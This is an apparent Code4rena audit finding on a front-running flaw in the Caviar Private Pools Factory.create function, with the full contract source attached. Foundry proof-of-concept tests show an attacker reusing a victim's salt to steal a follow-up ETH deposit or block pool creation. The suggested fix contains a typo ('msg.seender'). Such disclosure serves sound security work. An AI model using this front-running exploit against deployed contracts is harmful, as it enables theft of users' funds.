{
  "Title": "[M-11] Factory.create: Predictability of pool address creates multiple issues.",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/Factory.sol#L92\n\n\n# Vulnerability details\n\n## Impact\nThe `Factory.create` function is responsible for creating new `PrivatePool`s. It does this using the `LibClone.cloneDeterministic` function.\n\n```solidity\n    function create(\n        ...\n        bytes32 _salt,\n        ...\n    ) public payable returns (PrivatePool privatePool) {\n        if ((_baseToken == address(0) && msg.value != baseTokenAmount) || (_baseToken != address(0) && msg.value > 0)) {\n            revert PrivatePool.InvalidEthAmount();\n        }\n\n        // deploy a minimal proxy clone of the private pool implementation\n        privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(_salt)));\n\n        // ...\n    }\n```\n\nThe address of the new PrivatePool depends solely upon the `_salt` parameter provided by the user. Once the user's create transaction is broadcasted, the  `_salt` parameter can be viewed by anyone watching the public mempool.\n\nThis public readability of `_salt` parameter creates two issues:\n\n1. Stealing of user's deposit amount.\nIf a user intends to create new pool and deposit some funds in it then an attacker can frontrun the user's txns and capture the deposit amounts. Here is how this can happen:\n     - User broadcasts two txns, first one to create a pool with `XXX` as the salt and second one to deposit some ETH into the new pool.\n     - The attacker views these pending txns and frontruns them to create a PrivatePool for himself with same `XXX` salt.\n     - The new pool gets created for the attacker, the address of this pool will be same as what the user will be expecting for his pool.\n     - The user's create pool txn gets reverted but deposit txn gets executed successfully. Hence the user deposited ETH in  attacker's pool.\n     - Being the owner of the pool the attacker simply withdraws the deposited ETH from the PrivatePool.\n\n2. DoS for `Factory.create`.\nIf a user intends to create a PrivatePool, his create txn can be forcefully reverted by an attacker by deploying a pool for himself using the user's salt. Here is how this can happen:\n    - The user broadcasts the create pool txn with salt `XXX`.\n    - The attacker frontruns the user's txn and creates a pool for hiself using the same `XXX` salt.\n    - The user's original create txn gets reverted as attacker's pool already exist on the predetermined address.\n    - This attack can be repeated again and again resulting in DoS for the `Factory.create` function.\n\n## Proof of Concept\nThese test cases were added to `test/PrivatePool/Withdraw.t.sol` file and were ran using `forge test --ffi --mp test/PrivatePool/Withdraw.t.sol --mt test_audit`\n\n```solidity\n    function test_audit_create_stealDeposit() public {\n        address user1 = makeAddr(\"user1\");\n        vm.deal(user1, 10 ether);\n        vm.startPrank(user1);\n\n        address predictedAddress = factory.predictPoolDeploymentAddress(bytes32(0));\n\n        // tries to create pool and deposit funds\n        // 1. factory.create(...)\n        // 2. pool.deposit(...)\n\n        // but user2 frontruns the txns\n\n        address user2 = makeAddr(\"user2\");\n        changePrank(user2);\n\n        uint baseTokenAmount = 0;\n\n        PrivatePool pool = factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n        assertEq(predictedAddress, address(pool));\n        assertEq(factory.ownerOf(uint256(uint160(address(pool)))), address(user2));\n\n        changePrank(user1);\n\n        vm.expectRevert(LibClone.DeploymentFailed.selector);\n        factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n\n        pool.deposit{ value: 10 ether }(tokenIds, 10 ether);\n        assertEq(address(pool).balance, 10 ether);\n\n        changePrank(user2);\n        pool.withdraw(address(0), tokenIds, address(0), 10 ether);\n        assertEq(address(pool).balance, 0);\n        assertEq(user2.balance, 10 ether);\n    }\n\n    function test_audit_create_DoS() public {\n        address user1 = makeAddr(\"user1\");\n        vm.deal(user1, 10 ether);\n        vm.startPrank(user1);\n\n        address predictedAddress = factory.predictPoolDeploymentAddress(bytes32(0));\n\n        // user1 tries to create pool\n        // factory.create(...)\n\n        // but user2 frontruns the txn\n\n        address user2 = makeAddr(\"user2\");\n        changePrank(user2);\n\n        uint baseTokenAmount = 0;\n\n        PrivatePool pool = factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n        assertEq(predictedAddress, address(pool));\n        assertEq(factory.ownerOf(uint256(uint160(address(pool)))), address(user2));\n\n        changePrank(user1);\n\n        vm.expectRevert(LibClone.DeploymentFailed.selector);\n        factory.create{value: baseTokenAmount}(\n            baseToken,\n            nft,\n            virtualBaseTokenReserves,\n            virtualNftReserves,\n            changeFee,\n            feeRate,\n            merkleRoot,\n            true,\n            false,\n            bytes32(0),\n            tokenIds,\n            baseTokenAmount\n        );\n    }\n```\n\n## Tools Used\nFoundry\n\n## Recommended Mitigation Steps\nConsider making the upcoming pool address user specific by combining the salt value with user's address.\n```solidity\n    privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(\n        keccak256(abi.encode(msg.seender, _salt))\n    )));\n```",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2023-04-caviar-private-pools",
  "Code": [
    {
      "filename": "src/Factory.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\n/*\n *\n *       __________...----..____..-'``-..___\n *     ,'.                                  ```--.._\n *    :                                             ``._\n *    |                           --                    ``.\n *    |                 -0-           -.     -   -.        `.\n *    :                     __           --            .     \\\n *     `._____________     (  `.   -.-      --  -   .   `     \\\n *        `-----------------\\   \\_.--------..__..--.._ `. `.   :\n *                           `--'                     `-._ .   |\n *                                                        `.`  |\n *                                                          \\` |\n *                                                           \\ |\n *                                                           / \\`.\n *                                                          /  _\\-'\n *                                                         /_,'\n */\n\nimport {LibClone} from \"solady/utils/LibClone.sol\";\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\nimport {Owned} from \"solmate/auth/Owned.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\n\nimport {PrivatePool} from \"./PrivatePool.sol\";\nimport {PrivatePoolMetadata} from \"./PrivatePoolMetadata.sol\";\n\n/// @title Caviar Private Pool Factory\n/// @author out.eth (@outdoteth)\n/// @notice This contract is used to create and initialize new private pools. Each time a private pool is created, a new\n/// NFT representing that private pool is minted to the creator. All protocol fees also accrue to this contract and can\n/// be withdrawn by the admin.\ncontract Factory is ERC721, Owned {\n    using LibClone for address;\n    using SafeTransferLib for address;\n\n    event Create(address indexed privatePool, uint256[] tokenIds, uint256 baseTokenAmount);\n    event Withdraw(address indexed token, uint256 indexed amount);\n\n    /// @notice The address of the private pool implementation that proxies point to.\n    address public privatePoolImplementation;\n\n    /// @notice Helper contract that constructs the private pool metadata svg and json for each pool NFT.\n    address public privatePoolMetadata;\n\n    /// @notice The protocol fee that is taken on each buy/sell/change. It's in basis points: 350 = 3.5%.\n    uint16 public protocolFeeRate;\n\n    constructor() ERC721(\"Caviar Private Pools\", \"POOL\") Owned(msg.sender) {}\n\n    receive() external payable {}\n\n    /// @notice Creates a new private pool using the minimal proxy pattern that points to the private pool\n    /// implementation. The caller must approve the factory to transfer the NFTs that will be deposited to the pool.\n    /// @param _baseToken The address of the base token.\n    /// @param _nft The address of the NFT.\n    /// @param _virtualBaseTokenReserves The virtual base token reserves.\n    /// @param _virtualNftReserves The virtual NFT reserves.\n    /// @param _changeFee The change fee.\n    /// @param _feeRate The fee rate.\n    /// @param _merkleRoot The merkle root.\n    /// @param _useStolenNftOracle Whether to use the stolen NFT oracle.\n    /// @param _salt The salt that will used on deployment.\n    /// @param tokenIds The token ids to deposit to the pool.\n    /// @param baseTokenAmount The amount of base tokens to deposit to the pool.\n    /// @return privatePool The address of the private pool.\n    function create(\n        address _baseToken,\n        address _nft,\n        uint128 _virtualBaseTokenReserves,\n        uint128 _virtualNftReserves,\n        uint56 _changeFee,\n        uint16 _feeRate,\n        bytes32 _merkleRoot,\n        bool _useStolenNftOracle,\n        bool _payRoyalties,\n        bytes32 _salt,\n        uint256[] memory tokenIds, // put in memory to avoid stack too deep error\n        uint256 baseTokenAmount\n    ) public payable returns (PrivatePool privatePool) {\n        // check that the msg.value is equal to the base token amount if the base token is ETH or the msg.value is equal\n        // to zero if the base token is not ETH\n        if ((_baseToken == address(0) && msg.value != baseTokenAmount) || (_baseToken != address(0) && msg.value > 0)) {\n            revert PrivatePool.InvalidEthAmount();\n        }\n\n        // deploy a minimal proxy clone of the private pool implementation\n        privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(_salt)));\n\n        // mint the nft to the caller\n        _safeMint(msg.sender, uint256(uint160(address(privatePool))));\n\n        // initialize the pool\n        privatePool.initialize(\n            _baseToken,\n            _nft,\n            _virtualBaseTokenReserves,\n            _virtualNftReserves,\n            _changeFee,\n            _feeRate,\n            _merkleRoot,\n            _useStolenNftOracle,\n            _payRoyalties\n        );\n\n        if (_baseToken == address(0)) {\n            // transfer eth into the pool if base token is ETH\n            address(privatePool).safeTransferETH(baseTokenAmount);\n        } else {\n            // deposit the base tokens from the caller into the pool\n            ERC20(_baseToken).transferFrom(msg.sender, address(privatePool), baseTokenAmount);\n        }\n\n        // deposit the nfts from the caller into the pool\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            ERC721(_nft).safeTransferFrom(msg.sender, address(privatePool), tokenIds[i]);\n        }\n\n        // emit create event\n        emit Create(address(privatePool), tokenIds, baseTokenAmount);\n    }\n\n    /// @notice Sets private pool metadata contract.\n    /// @param _privatePoolMetadata The private pool metadata contract.\n    function setPrivatePoolMetadata(address _privatePoolMetadata) public onlyOwner {\n        privatePoolMetadata = _privatePoolMetadata;\n    }\n\n    /// @notice Sets the private pool implementation contract that newly deployed proxies point to.\n    /// @param _privatePoolImplementation The private pool implementation contract.\n    function setPrivatePoolImplementation(address _privatePoolImplementation) public onlyOwner {\n        privatePoolImplementation = _privatePoolImplementation;\n    }\n\n    /// @notice Sets the protocol fee that is taken on each buy/sell/change. It's in basis points: 350 = 3.5%.\n    /// @param _protocolFeeRate The protocol fee.\n    function setProtocolFeeRate(uint16 _protocolFeeRate) public onlyOwner {\n        protocolFeeRate = _protocolFeeRate;\n    }\n\n    /// @notice Withdraws the earned protocol fees.\n    /// @param token The token to withdraw.\n    /// @param amount The amount to withdraw.\n    function withdraw(address token, uint256 amount) public onlyOwner {\n        if (token == address(0)) {\n            msg.sender.safeTransferETH(amount);\n        } else {\n            ERC20(token).transfer(msg.sender, amount);\n        }\n\n        emit Withdraw(token, amount);\n    }\n\n    /// @notice Returns the token URI for a given token id.\n    /// @param id The token id.\n    /// @return uri The token URI.\n    function tokenURI(uint256 id) public view override returns (string memory) {\n        return PrivatePoolMetadata(privatePoolMetadata).tokenURI(id);\n    }\n\n    /// @notice Predicts the deployment address of a new private pool.\n    /// @param salt The salt that will used on deployment.\n    /// @return predictedAddress The predicted deployment address of the private pool.\n    function predictPoolDeploymentAddress(bytes32 salt) public view returns (address predictedAddress) {\n        predictedAddress = privatePoolImplementation.predictDeterministicAddress(salt, address(this));\n    }\n}"
    }
  ]
}